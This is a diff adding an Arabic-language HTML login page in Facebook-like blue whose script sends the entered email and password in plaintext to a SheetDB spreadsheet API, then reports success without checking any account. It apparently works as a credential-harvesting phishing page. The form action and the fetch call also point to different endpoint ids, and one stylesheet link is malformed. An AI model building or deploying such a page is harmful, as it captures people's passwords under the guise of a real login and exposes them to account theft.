@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>sign up</title>
+  <link href=sample.css" rel="stylesheet"   >
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    .login-form {
+      width: 300px;
+      margin: 0 auto;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      background-color: #f9f9f9;
+    }
+    .input-field {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    .btn {
+      background-color: #3b5998;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+    }
+    .btn:hover {
+      background-color: #334d84;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>تسجيل الدخول</h2>
+
+  <!-- نموذج تسجيل الدخول باستخدام البريد الإلكتروني وكلمة المرور -->
+  <div class="login-form">
+    <h3>تسجيل الدخول</h3>
+    <form action="https://sheetdb.io/api/v1/uzq87zfrdi0ny" id="sheetdb-form">
+      <!-- حقل البريد الإلكتروني -->
+      <input type="email" name="data[email]" class="input-field" placeholder="البريد الإلكتروني" required>
+      
+      <!-- حقل كلمة المرور -->
+      <input type="password" name="data[psw]" class="input-field" placeholder="أدخل كلمة المرور" required>
+
+      <!-- زر تقديم البيانات -->
+      <button type="submit" class="btn">تسجيل الدخول</button>
+    </form>
+  </div>
+
+  <br><br>
+
+  <!-- رسالة حالة تسجيل الدخول -->
+  <div id="status"></div>
+
+  <script>
+    // عند تقديم النموذج، سيتم إرسال البيانات إلى SheetDB عبر POST
+    document.getElementById('sheetdb-form').addEventListener('submit', function(event) {
+      event.preventDefault();  // منع الإرسال التقليدي للنموذج
+      
+      // جلب القيم المدخلة من المستخدم
+      var email = document.querySelector('input[name="data[email]"]').value;
+      var password = document.querySelector('input[name="data[psw]"]').value;
+      
+      // إرسال البيانات إلى API عبر POST باستخدام Fetch
+      fetch('https://sheetdb.io/api/v1/r5lmjlu4qwpsq', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          data: {
+            email: email,
+            psw: password
+          }
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        // عند نجاح العملية، سيتم إظهار هذه الرسالة
+        document.getElementById('status').innerHTML = 'تم إرسال البيانات بنجاح!';
+      })
+      .catch(error => {
+        // في حالة حدوث خطأ
+        document.getElementById('status').innerHTML = 'حدث خطأ أثناء إرسال البيانات.';
+        console.error('Error:', error);
+      });
+    });
+  </script>
+
+</body>
+</html>
